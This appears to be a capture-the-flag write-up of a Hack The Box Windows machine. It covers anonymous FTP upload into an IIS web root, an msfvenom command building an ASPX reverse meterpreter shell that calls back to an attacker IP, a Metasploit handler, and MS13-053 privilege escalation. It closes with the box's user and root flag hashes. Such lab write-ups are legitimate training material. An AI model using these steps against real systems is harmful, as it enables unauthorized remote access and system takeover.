
Let's start enumeration with nmap.

``` bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
| 07-18-23  11:27AM                 3474 reverse.aspx
| 07-18-23  11:19AM                   31 test.html
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Found two open ports 

	22 ftp(commonly used for file transfer)
	80 http(used for web) http allow us trace method will enumurate it further
	
First try to login as Anonymous user on FTP

After login successfully as Anonymous user we will now try to upload files on ftp server and we got success on it

<img alt="Pasted image 20230718025049" src="https://github.com/iammR0OT/HTB/assets/74102381/52dbb8da-3f50-4348-a0e7-49e38dc4ec09">

 Now we found that the port 80 is also open lets find out what is running on that port
 
<img alt="Pasted image 20230718025202" src="https://github.com/iammR0OT/HTB/assets/74102381/d73f7428-49b9-47b0-975c-e1f21185cc35">

See some web files on ftp server 

Lets try to find out if that files are this web server files by try to access key.txt file we upload on the ftp server.

<img alt="Pasted image 20230718025340" src="https://github.com/iammR0OT/HTB/assets/74102381/c3729335-bba5-4bbe-bdb6-2c302da746af">

And we got success which means we can upload any file on ftp server access it through webserver

With response header we can identify that Miscrosoft IIS 7.5 is running as a server

<img alt="Pasted image 20230718025545" src="https://github.com/iammR0OT/HTB/assets/74102381/9430c8db-94d8-47ce-a6d2-adbe82088a4a">

Lets try to find out its exploit

After some research we find out that we can run any command on webserver through this vulnerability

Lets try to create reverse shell file using msfvenom and upload it on ftp server and run it through webserver

 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.71 LPORT=6969 -f aspx -o shell.aspx`
 
Now, Lets upload it to the webserver and start mscvenom multihandler
to get shell back

For that run metasploit 
	`msfconsole`
Set generic payload handler
	`set exploit/multi/handler`
Set payload type
	`set payload windows/meterpreter/reverse_tcp`
Change the lport with you attacer machine port and lhost to your attacker machine ip
	`run`
After running` shell.aspx` on webserver we got a successful reverse shell on our meterpreter

<img  alt="Pasted image 20230718032142" src="https://github.com/iammR0OT/HTB/assets/74102381/041683d0-b954-483a-a2e9-ee521bca50ae">


Now we have to do privilege Esclation

For that we will first background our current session using `background` command
now we will use **post/multi/recon/local_exploit_suggester** 

It runs basic exploits to find out if the machine is vulnerable to the exploit

<img alt="Pasted image 20230718220206" src="https://github.com/iammR0OT/HTB/assets/74102381/0d6535d5-52d6-4ad8-9a9e-aca18cda3934">

And we find that machine is vulnerable to a lot of vulnerabilities

We will use **exploit/windows/local/ms13_053_schlamperei**

It will create a **dll injcetion** on processes 

After the exploit successfully run we will **migrate** our exploited process to the previous process to gain root shell

And we got our beautiful root shell on machine

<img alt="Pasted image 20230718220523" src="https://github.com/iammR0OT/HTB/assets/74102381/cb370024-4506-44dc-a263-333c62e30cfd">

```
User =>> 64934acc103a0b330096c3219f15a486
Root =>> dd6943fb4d4b90be0fbb0bfd3e603372
```
